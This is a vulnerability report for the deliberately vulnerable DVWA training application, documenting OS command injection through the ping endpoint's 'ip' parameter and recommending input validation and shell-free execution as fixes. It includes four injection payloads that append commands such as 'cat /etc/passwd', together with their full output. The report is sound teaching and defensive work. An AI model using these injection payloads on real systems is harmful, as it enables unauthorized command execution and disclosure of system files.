# DVWA - OS command injection (RCE)

## Summary
An OS command injection vulnerability was confirmed on the DVWA `/vulnerabilities/exec/` endpoint. The application accepts user input via the `ip` parameter and concatenates it directly into a shell-executed `ping` command without sanitization or filtering. This allows an attacker to append arbitrary operating system commands using shell metacharacters and execute them with the privileges of the web-server user.

The vulnerability was demonstrated by executing the following commands:
* **`id`**: Returned `uid=33(www-data) gid=33(www-data) groups=33(www-data)`, confirming execution as the unprivileged web-server user `www-data`.
* **`whoami`**: Confirmed the active shell session user is `www-data`.
* **`uname -a`**: Disclosed kernel details (`Linux 4798b9b5a6d1 6.6.87.1-microsoft-standard-WSL2 #1 SMP PREEMPT_DYNAMIC Mon Apr 21 17:08:54 UTC 2025 x86_64 GNU/Linux`).
* **`cat /etc/passwd`**: Successfully read and disclosed the system's `/etc/passwd` file, demonstrating unauthorized local file disclosure.

### Severity: Critical
This vulnerability is rated **Critical** because it grants full Remote Code Execution (RCE) on the underlying system. A remote attacker can leverage RCE to:
1. Establish interactive reverse shells to gain persistent access.
2. Compromise local application databases, configuration files, and application source code (leading to complete data theft).
3. Conduct internal network reconnaissance and lateral movement to compromise other infrastructure on the internal network.

---

## Evidence

Below are the HTTP payload parameters and the corresponding server responses demonstrating execution of arbitrary system commands.

### Payload 1: `ip='127.0.0.1; id'`
```
		PING 127.0.0.1 (127.0.0.1): 56 data bytes
64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.840 ms
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.088 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.080 ms
64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.092 ms
--- 127.0.0.1 ping statistics ---
4 packets transmitted, 4 packets received, 0% packet loss
round-trip min/avg/max/stddev = 0.080/0.275/0.840/0.326 ms
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Payload 2: `ip='127.0.0.1; whoami'`
```
		PING 127.0.0.1 (127.0.0.1): 56 data bytes
64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.059 ms
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.078 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.084 ms
64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.041 ms
--- 127.0.0.1 ping statistics ---
4 packets transmitted, 4 packets received, 0% packet loss
round-trip min/avg/max/stddev = 0.041/0.066/0.084/0.000 ms
www-data
```

### Payload 3: `ip='127.0.0.1; uname -a'`
```
		PING 127.0.0.1 (127.0.0.1): 56 data bytes
64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.273 ms
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.046 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.080 ms
64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.095 ms
--- 127.0.0.1 ping statistics ---
4 packets transmitted, 4 packets received, 0% packet loss
round-trip min/avg/max/stddev = 0.046/0.123/0.273/0.088 ms
Linux 4798b9b5a6d1 6.6.87.1-microsoft-standard-WSL2 #1 SMP PREEMPT_DYNAMIC Mon Apr 21 17:08:54 UTC 2025 x86_64 GNU/Linux
```

### Payload 4: `ip='127.0.0.1; cat /etc/passwd'`
```
		PING 127.0.0.1 (127.0.0.1): 56 data bytes
64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.027 ms
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.041 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.053 ms
64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.067 ms
--- 127.0.0.1 ping statistics ---
4 packets transmitted, 4 packets received, 0% packet loss
round-trip min/avg/max/stddev = 0.027/0.047/0.067/0.000 ms
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/bin/false
mysql:x:101:101:MySQL Server,,,:/nonexistent:/bin/false
```

---

## Root Cause

The vulnerability arises due to insecure implementation of OS command invocation in PHP. The application constructs a system command using direct string concatenation:

$$\text{Command} = \text{"ping -c 4 " } + \text{user\_input}$$

This constructed string is passed to system execution functions like `shell_exec()` or `system()`. Because these functions default to spawning a system shell (e.g., `/bin/sh` or `/bin/bash`) to run the command, shell metacharacters such as semicolon (`;`), pipe (`|`), ampersand (`&`), backticks (\` \`), or command substitution sequences (`$()`) are parsed and executed by the shell. 

Consequently, an attacker can append a delimiter (like a semicolon) followed by a secondary command. The shell processes the initial `ping` command, encounters the delimiter, and sequentially runs the attacker's injected command.

---

## Remediation

### Primary Fix
The most secure practice is to avoid executing system-level shell commands dynamically using untrusted user input. If operating system execution cannot be avoided, the application must:
1. **Strictly Validate Input**: Ensure input strictly conforms to the expected data format (e.g., a valid IPv4/IPv6 address) using built-in validators rather than custom sanitization filters.
2. **Avoid Spawning a Shell**: Invoke target binaries directly using system execution functions that support passing arguments as an array (e.g., `proc_open` or `pcntl_exec`). Array-based execution bypasses the command interpreter (shell) entirely, preventing command injection metacharacters from being evaluated.

#### Concrete Secure PHP Example:
```php
<?php
if (isset($_POST['ip'])) {
    $ip = $_POST['ip'];

    // 1. Strict Input Validation
    if (filter_var($ip, FILTER_VALIDATE_IP)) {
        
        // 2. Safe Execution: Call binary directly using argument array to bypass shell parsing
        $descriptors = [
            0 => ["pipe", "r"], // stdin
            1 => ["pipe", "w"], // stdout
            2 => ["pipe", "w"]  // stderr
        ];

        // Command arguments are isolated inside the array
        $process = proc_open(['ping', '-c', '4', $ip], $descriptors, $pipes);

        if (is_resource($process)) {
            $output = stream_get_contents($pipes[1]);
            
            fclose($pipes[0]);
            fclose($pipes[1]);
            fclose($pipes[2]);
            proc_close($process);

            echo "<pre>" . htmlspecialchars($output) . "</pre>";
        } else {
            echo "Execution failed.";
        }
    } else {
        echo "Error: Invalid IP address format provided.";
    }
}
?>
```
*Note: If legacy execution functions like `shell_exec()` must be used, always sanitize values strictly using `escapeshellarg()` on a rigorously validated IP structure.*

### Defense in Depth
* **Strict Input Allowlisting**: Implement a strict regular expression filter to only permit characters that comprise a valid IP address.
* **Least Privilege Containerization**: Run the web server under a minimally privileged, non-login user identity inside a hardened container environment (e.g., read-only filesystem, dropping standard capabilities).
* **Egress Network Filtering**: Restrict outbound network access from the web server. Block arbitrary outbound TCP/UDP traffic to minimize the possibility of reverse shell connectivity.
* **Hardening `php.ini` Configuration**: Disable high-risk execution functions globally by defining them in the `disable_functions` directive:
  ```ini
  disable_functions = shell_exec,system,exec,passthru,popen,proc_open
  ```
* **Web Application Firewall (WAF)**: Deploy a WAF to detect and drop payloads containing common command injection signatures (such as command delimiters followed by high-risk executable strings).
